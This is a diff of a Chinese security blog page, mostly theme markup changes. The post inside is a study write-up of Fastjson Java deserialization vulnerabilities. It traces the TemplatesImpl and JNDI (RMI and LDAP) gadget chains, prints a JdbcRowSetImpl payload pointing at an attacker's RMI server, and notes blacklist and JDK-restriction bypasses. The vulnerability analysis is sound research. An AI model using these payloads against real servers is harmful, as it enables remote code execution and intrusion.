@@ -1,53 +1,132 @@
+
+
 <!DOCTYPE html>
-<html lang="zh-CN">
-
-
+<html lang="zh-CN" data-default-color-scheme=auto>
 
 
 
 <head>
   <meta charset="UTF-8">
+
   <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
-  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <link rel="icon" href="/css/images/bg/favicon.ico">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="摸鱼">
   <meta name="author" content="Aluvion">
   <meta name="keywords" content="">
+  
+    <meta name="description" content="前言(2020&#x2F;03&#x2F;16更新)一直想学习一下Java反序列化漏洞的相关利用，寒假期间学习了Java原生类的反序列化漏洞（Apache Commons Collections组件），不过到现在都还没有做一个总结。刚好最近有师傅问到shiro反序列化漏洞的相关事情，所以现在从这篇文章开始，学习各种Java反序列化漏洞，顺便做一个总结并记录下来。环境搭建采用的是Maven+Spri">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化漏洞-Fastjson">
+<meta property="og:url" content="http://yoursite.com/2019/03/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-Fastjson/index.html">
+<meta property="og:site_name" content="Twings">
+<meta property="og:description" content="前言(2020&#x2F;03&#x2F;16更新)一直想学习一下Java反序列化漏洞的相关利用，寒假期间学习了Java原生类的反序列化漏洞（Apache Commons Collections组件），不过到现在都还没有做一个总结。刚好最近有师傅问到shiro反序列化漏洞的相关事情，所以现在从这篇文章开始，学习各种Java反序列化漏洞，顺便做一个总结并记录下来。环境搭建采用的是Maven+Spri">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031701.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031702.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031703.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031704.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031705.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031706.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031707.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031708.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031709.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031710.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031801.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031802.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031803.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031804.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031805.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031806.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031807.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031808.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031809.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031810.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031811.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031812.png">
+<meta property="og:image" content="http://yoursite.com/css/images/java_fastjson/2019031813.png">
+<meta property="article:published_time" content="2019-03-17T15:50:00.000Z">
+<meta property="article:modified_time" content="2022-04-15T13:45:13.555Z">
+<meta property="article:author" content="Aluvion">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="FastJSON">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://yoursite.com/css/images/java_fastjson/2019031701.png">
+  
+  
+  
   <title>Java反序列化漏洞-Fastjson - Twings</title>
 
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
-<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
-<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
-<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
 
 
-  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
 
 <link  rel="stylesheet" href="/css/main.css" />
 
 
-  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
 
 
-<!-- 自定义样式保持在最底部 -->
 
 
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"yoursite.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
 <meta name="generator" content="Hexo 7.3.0"></head>
 
 
 <body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand"
-       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
 
     <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
             data-target="#navbarSupportedContent"
@@ -63,46 +142,75 @@
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/">首页</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/archives/">归档</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/tags/">标签</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/about/">关于</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/links/">友链</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
         
         
           <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
           </li>
         
       </ul>
@@ -110,73 +218,92 @@
   </div>
 </nav>
 
-    <div class="view intro-2" id="background" parallax=true
-         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask rgba-black-light flex-center">
-          <div class="container text-center white-text fadeInUp">
-            <span class="h2" id="subtitle">
-              
-            </span>
+  
 
-            
-              
-                <p class="mt-3 post-meta">
-                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-                  星期日, 三月 17日 2019, 11:50 晚上
-                </p>
-              
-
-              <p class="mt-1">
-                
-                  
-                  <span class="post-meta">
-                    <i class="far fa-chart-bar"></i>
-                    3.3k 字
-                  </span>
-                
-
-                
-                  
-                  <span class="post-meta">
-                      <i class="far fa-clock"></i>
-                      14 分钟
-                  </span>
-                
-
-                
-                  <!-- 不蒜子统计文章PV -->
-                  
-                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
-                    <i class="far fa-eye" aria-hidden="true"></i>
-                    <span id="busuanzi_value_page_pv"></span> 次
-                  </span>
-                
-              </p>
-            
-          </div>
-
+<div id="banner" class="banner" parallax=true
+     style="background: url('/css/images/bg/bg5.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Java反序列化漏洞-Fastjson"></span>
           
         </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2019-03-17 23:50" pubdate>
+          2019年3月17日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          27 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
       </div>
+
+      
     </div>
+  </div>
+</div>
+
+</div>
+
   </header>
 
   <main>
     
       
 
-<div class="container-fluid">
-  <div class="row">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-md">
-      <div class="container nopadding-md" id="board-ctn">
-        <div class="py-5 z-depth-3" id="board">
-          <div class="post-content mx-auto" id="post">
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Java反序列化漏洞-Fastjson</h1>
             
-            <div class="markdown-body">
-              <h3 id="前言-2020-03-16更新"><a href="#前言-2020-03-16更新" class="headerlink" title="前言(2020&#x2F;03&#x2F;16更新)"></a>前言(2020&#x2F;03&#x2F;16更新)</h3><p>一直想学习一下Java反序列化漏洞的相关利用，寒假期间学习了Java原生类的反序列化漏洞（Apache Commons Collections组件），不过到现在都还没有做一个总结。刚好最近有师傅问到shiro反序列化漏洞的相关事情，所以现在从这篇文章开始，学习各种Java反序列化漏洞，顺便做一个总结并记录下来。环境搭建采用的是Maven+Spring MVC，方便快捷。</p>
+            
+              <div class="markdown-body">
+                
+                <h3 id="前言-2020-03-16更新"><a href="#前言-2020-03-16更新" class="headerlink" title="前言(2020&#x2F;03&#x2F;16更新)"></a>前言(2020&#x2F;03&#x2F;16更新)</h3><p>一直想学习一下Java反序列化漏洞的相关利用，寒假期间学习了Java原生类的反序列化漏洞（Apache Commons Collections组件），不过到现在都还没有做一个总结。刚好最近有师傅问到shiro反序列化漏洞的相关事情，所以现在从这篇文章开始，学习各种Java反序列化漏洞，顺便做一个总结并记录下来。环境搭建采用的是Maven+Spring MVC，方便快捷。</p>
 <h3 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h3><p>Fastjson是一个性能很好的Java语言实现的Json解析器和生成器，由来自阿里巴巴的工程师开发。具有极快的性能，接口简单易用。Fastjson使用parseObject来进行反序列化。</p>
 <p>Fastjson提供了两个主要接口toJSONString和parseObject来实现Json数据的序列化和反系列化。</p>
 <p>项目地址：<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p>
@@ -203,25 +330,25 @@
 
 <p>@type：解析类，_bytecodes：恶意字节码，_outputProperties：调用outputProperties变量的get方法getOutputProperties。</p>
 <h6 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h6><p>我们给parseObject函数下断点进行调试，可以看到代码先根据input、config和featureValues生成Json解析类，然后调用它的parseObject函数进行反序列化处理：</p>
-<p><img src="/css/images/java_fastjson/2019031701.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031701.png" srcset="/img/loading.gif" lazyload></p>
 <p>我们继续走下去，可以看到下一步是derializer.deserialze函数：</p>
-<p><img src="/css/images/java_fastjson/2019031702.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031702.png" srcset="/img/loading.gif" lazyload></p>
 <p>然后是parser.parse：</p>
-<p><img src="/css/images/java_fastjson/2019031703.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031703.png" srcset="/img/loading.gif" lazyload></p>
 <p>在这个函数中开始对Json进行解析，先判断了第一个字符，因为payload的第一个字符是{，所以进入了分支LBRACE中：</p>
-<p><img src="/css/images/java_fastjson/2019031704.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031704.png" srcset="/img/loading.gif" lazyload></p>
 <p>然后调用了parseObject函数对Json的内容进行解析，获取了键值：</p>
-<p><img src="/css/images/java_fastjson/2019031705.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031705.png" srcset="/img/loading.gif" lazyload></p>
 <p>接着开始获取type中所写明的类：</p>
-<p><img src="/css/images/java_fastjson/2019031706.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031706.png" srcset="/img/loading.gif" lazyload></p>
 <p>接下来调用deserializer.deserialze函数：</p>
-<p><img src="/css/images/java_fastjson/2019031707.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031707.png" srcset="/img/loading.gif" lazyload></p>
 <p>我们跟进去，里面对Json字符串中的各个键值进行了解析，然后调用了parseField函数，当传入的key为_outputProperties的时候，漏洞触发，我们跟进去看看。看到代码调用了fieldDeserializer.parseField-&gt;setValue，最后调用invoke函数：</p>
-<p><img src="/css/images/java_fastjson/2019031708.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031708.png" srcset="/img/loading.gif" lazyload></p>
 <p>调用了getOutputProperties函数，我们继续走下去，最后来到newTransformer函数：</p>
-<p><img src="/css/images/java_fastjson/2019031709.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031709.png" srcset="/img/loading.gif" lazyload></p>
 <p>可以看到这里调用getTransletInstance()函数实例化了类，然后就执行了类的构造函数，导致了代码执行漏洞：</p>
-<p><img src="/css/images/java_fastjson/2019031710.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031710.png" srcset="/img/loading.gif" lazyload></p>
 <p>以上就是对基于TemplateImpl的Fastjson反序列化漏洞利用的分析。</p>
 <h4 id="基于JNDI"><a href="#基于JNDI" class="headerlink" title="基于JNDI"></a>基于JNDI</h4><h5 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h5><h6 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h6><p>JDK&lt;&#x3D;8u121，Oracle在jdk8u121之后设置了com.sun.jndi.rmi.object.trustURLCodebase为 false，限制了 RMI 利用方式中从远程加载，会报错：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.</span><br></pre></td></tr></table></figure>
@@ -236,11 +363,11 @@
 <h6 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
 
 <h6 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h6><p>同样给JSON.parseObject下断点进行调试，可以看到与之前不同的是这次通过了if (matchField)的判断，进入了另一个分支，调用了setValue函数：</p>
-<p><img src="/css/images/java_fastjson/2019031801.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031801.png" srcset="/img/loading.gif" lazyload></p>
 <p>然后调用了autoCommit的setter函数setAutoCommit：</p>
-<p><img src="/css/images/java_fastjson/2019031802.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031802.png" srcset="/img/loading.gif" lazyload></p>
 <p>最后调用了connect函数，连接了攻击者开启了RMI服务：</p>
-<p><img src="/css/images/java_fastjson/2019031803.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031803.png" srcset="/img/loading.gif" lazyload></p>
 <p>以上就是对RMI的Fastjson反序列化漏洞利用的简要分析，跟基于TemplateImpl的原理差不多，都是利用了类的getter或者setter。</p>
 <h6 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h6><p>在服务端有Tomcat的org.apache.naming.factory.BeanFactory类的时候，可以尝试绕过。</p>
 <p><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p>
@@ -265,28 +392,28 @@
 
 <h6 id="漏洞分析-payload1"><a href="#漏洞分析-payload1" class="headerlink" title="漏洞分析-payload1"></a>漏洞分析-payload1</h6><p>payload1分析同RMI，不再加以分析。</p>
 <h6 id="漏洞分析-payload2"><a href="#漏洞分析-payload2" class="headerlink" title="漏洞分析-payload2"></a>漏洞分析-payload2</h6><p>首先跟RMI一样进入了if (matchField)并调用了setValue函数，然后调用了PropertyPath的setter函数setPropertyPath，给PropertyPath变量赋了值，到这里还没有触发漏洞。接下来的处理跟基于TemplateImpl的一样，调用了parseField函数，将字段beanFactory作为参数传入：</p>
-<p><img src="/css/images/java_fastjson/2019031804.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031804.png" srcset="/img/loading.gif" lazyload></p>
 <p>这里调用fieldValueDeserilizer.deserialze获取了beanFactory中的org.springframework.jndi.support.SimpleJndiBeanFactory实例，然后进入setValue函数：</p>
-<p><img src="/css/images/java_fastjson/2019031805.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031805.png" srcset="/img/loading.gif" lazyload></p>
 <p>再调用setter函数setBeanFactory：</p>
-<p><img src="/css/images/java_fastjson/2019031806.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031806.png" srcset="/img/loading.gif" lazyload></p>
 <p>这里可以看到有一个判断this.propertyPath &#x3D;&#x3D; null，如果不传入propertyPath就会直接抛出异常终止程序：</p>
-<p><img src="/css/images/java_fastjson/2019031807.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031807.png" srcset="/img/loading.gif" lazyload></p>
 <p>然后将攻击者提供的恶意IDAP地址作为参数，调用this.beanFactory.getBean，即org.springframework.jndi.support.SimpleJndiBeanFactory.getBean函数，最后调用lookup函数连接了攻击者的恶意IDAP：</p>
-<p><img src="/css/images/java_fastjson/2019031808.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031808.png" srcset="/img/loading.gif" lazyload></p>
 <p>以上就是对payload2的简要分析，同样原理差不多，但是两层嵌套结构很精妙。</p>
 <h6 id="漏洞分析-payload3"><a href="#漏洞分析-payload3" class="headerlink" title="漏洞分析-payload3"></a>漏洞分析-payload3</h6><p>payload3分析大致同RMI（应该？），且我本地没有这个类，所以也不加以分析。</p>
 <h6 id="漏洞分析-payload4"><a href="#漏洞分析-payload4" class="headerlink" title="漏洞分析-payload4"></a>漏洞分析-payload4</h6><p>payload4跟payload3相似，不过payload4是Set类型，且结构更复杂一点。</p>
 <p>这次我偷个懒，直接找到最后的触发点，然后查看调用栈，最后触发点跟payload3遗址，同样是lookup函数。因为类型为Set的缘故，所以不会进入其他payload进入的分支LBRACE，而是进入SET分支中：</p>
-<p><img src="/css/images/java_fastjson/2019031809.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031809.png" srcset="/img/loading.gif" lazyload></p>
 <p>这里通过HashSet来对Set类型进行处理，最后在putVal函数中调用了key.equals函数：</p>
-<p><img src="/css/images/java_fastjson/2019031810.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031810.png" srcset="/img/loading.gif" lazyload></p>
 <p>即DefaultBeanFactoryPointcutAdvisor的equals，由于继承关系，最后调用了AbstractPointcutAdvisor的equals，再调用了getAdvice函数：</p>
-<p><img src="/css/images/java_fastjson/2019031811.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031811.png" srcset="/img/loading.gif" lazyload></p>
 <p>然后调用了getBean：</p>
-<p><img src="/css/images/java_fastjson/2019031812.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031812.png" srcset="/img/loading.gif" lazyload></p>
 <p>最后就是触发点的doGetSingleton函数了：</p>
-<p><img src="/css/images/java_fastjson/2019031813.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/java_fastjson/2019031813.png" srcset="/img/loading.gif" lazyload></p>
 <p>以上就是对payload4的简要分析，跟其他payload不同的就是这种payload没有用到getter或者setter，而是用的Set-&gt;HashMap-&gt;equals这样一个调用链。</p>
 <hr>
 <h3 id="2020-03-15-更新-fastjson-1-2-61"><a href="#2020-03-15-更新-fastjson-1-2-61" class="headerlink" title="2020&#x2F;03&#x2F;15 更新 - fastjson 1.2.61"></a>2020&#x2F;03&#x2F;15 更新 - fastjson 1.2.61</h3><p>参考文章：<a href="https://curz0n.github.io/2019/09/24/fastjson_1_2_61_blacklist_bypass/">https://curz0n.github.io/2019/09/24/fastjson_1_2_61_blacklist_bypass/</a></p>
@@ -329,83 +456,165 @@
 <p><a href="https://bl4ck.in/tricks/2019/01/04/JNDI-Injection-Bypass.html">https://bl4ck.in/tricks/2019/01/04/JNDI-Injection-Bypass.html</a></p>
 <p><a href="http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/">http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/</a></p>
 
-            </div>
-            <hr>
+                
+              </div>
+            
+            <hr/>
             <div>
-              <p>
-                
-                
-                  <span>
-                <i class="iconfont icon-tag"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
-                    
-                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
-                    
-                      <a class="hover-with-bg" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
-                    
-                      <a class="hover-with-bg" href="/tags/FastJSON/">FastJSON</a>
-                    
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/" class="print-no-link">#Web</a>
+      
+        <a href="/tags/Java/" class="print-no-link">#Java</a>
+      
+        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="print-no-link">#反序列化</a>
+      
+        <a href="/tags/FastJSON/" class="print-no-link">#FastJSON</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Java反序列化漏洞-Fastjson</div>
+      <div>http://yoursite.com/2019/03/17/Java反序列化漏洞-Fastjson/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Aluvion</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2019年3月17日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
                   </span>
-                
-              </p>
+                </a>
               
-                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
               
-              
-                <div class="post-prevnext row">
-                  <div class="post-prev col-12 col-md-6">
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
                     
-                      <a href="/2019/03/22/%E5%88%92%E6%B0%B4CVE-2019-9194%E5%A4%8D%E7%8E%B0/">
-                        <i class="fa fa-chevron-left"></i>
-                        <span>划水CVE-2019-9194复现</span>
+                    
+                      <a href="/2019/03/22/%E5%88%92%E6%B0%B4CVE-2019-9194%E5%A4%8D%E7%8E%B0/" title="划水CVE-2019-9194复现">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">划水CVE-2019-9194复现</span>
+                        <span class="visible-mobile">上一篇</span>
                       </a>
                     
-                  </div>
-                  <div class="post-next col-12 col-md-6">
+                  </article>
+                  <article class="post-next col-6">
                     
-                      <a href="/2019/03/16/wordpress5-1-CSRF-to-XSS-to-RCE%E5%A4%8D%E7%8E%B0/">
-                        <span>wordpress5.1-CSRF_to_XSS_to_RCE复现</span>
-                        <i class="fa fa-chevron-right"></i>
+                    
+                      <a href="/2019/03/16/wordpress5-1-CSRF-to-XSS-to-RCE%E5%A4%8D%E7%8E%B0/" title="wordpress5.1-CSRF_to_XSS_to_RCE复现">
+                        <span class="hidden-mobile">wordpress5.1-CSRF_to_XSS_to_RCE复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
                       </a>
                     
-                  </div>
+                  </article>
                 </div>
               
             </div>
 
-              
-          </div>
+            
+          </article>
         </div>
       </div>
     </div>
-    
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc-start"></div>
-<div id="toc">
-  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
-  <div id="tocbot"></div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
 </div>
 
-      </div>
-    
+
+
+  </aside>
+
+
+    </div>
   </div>
 </div>
 
-<!-- Custom -->
+
+
+
+
+  
+
+
+
